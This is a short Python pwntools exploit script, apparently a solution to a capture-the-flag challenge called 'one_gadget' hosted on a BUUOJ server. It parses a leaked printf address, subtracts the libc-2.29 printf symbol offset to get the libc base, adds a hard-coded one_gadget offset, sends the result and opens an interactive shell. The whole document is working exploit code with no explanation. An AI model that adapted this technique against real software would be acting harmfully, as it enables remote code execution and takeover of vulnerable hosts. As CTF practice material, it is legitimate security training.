from pwn import *

context(log_level='debug')

#io=process("./one_gadget")

io=remote("node3.buuoj.cn",28205)

elf=ELF("./one_gadget")

libc=ELF("./libc-2.29.so")

io.recvuntil(b'u:0x')

printf_addr=int(io.recvuntil(b'\n',drop=True),16)

#addr=io.recv(6)

#printf_addr=u64(addr.rjust(8,b'\x00'))

print(hex(printf_addr))

#io.recv()
one_gadget =[0xe237f,0xe2383,0xe2386,0x106ef8]

base=printf_addr-libc.symbols['printf']

shell=one_gadget[3]+base

io.sendline(str(shell))

io.interactive()